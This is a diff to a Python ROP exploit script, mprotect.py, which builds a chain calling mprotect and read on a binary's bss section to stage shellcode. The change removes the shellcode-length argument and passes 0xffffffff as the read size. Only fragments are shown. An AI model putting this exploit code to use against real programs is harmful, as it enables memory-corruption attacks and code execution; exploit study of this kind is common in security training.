@@ -54,7 +54,6 @@ def rop_exploit(binary_name):
     # Padding
     exploit = b'\x41' * padding
 
-    shellcode_len = stat(sys.argv[3]).st_size
     commands = {"eax" : push_to_reg(0x0000007D,"eax",gadgets,rop),    
                 "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
                 "ecx" : push_to_reg(0x0000800,"ecx",gadgets,rop),
@@ -69,7 +68,7 @@ def rop_exploit(binary_name):
     commands = {"eax" : push_to_reg(3,"eax",gadgets,rop),
                 "ebx" : push_to_reg(0,"ebx",gadgets,rop),
                 "ecx" : push_to_reg(bss,"ecx",gadgets,rop), 
-                "edx" : push_to_reg(shellcode_len,"edx",gadgets,rop)}
+                "edx" : push_to_reg(0xffffffff,"edx",gadgets,rop)}
 
     
     exploit += schedule(commands)
@@ -84,8 +83,8 @@ def rop_exploit(binary_name):
 
 
 def main():
-    if len(sys.argv) < 4:
-        print("Usage mprotect.py <binary name> <payload name> <shellcode name>")
+    if len(sys.argv) < 3:
+        print("Usage mprotect.py <binary name> <payload name>")
         exit(1)
 
     binary_name = sys.argv[1]
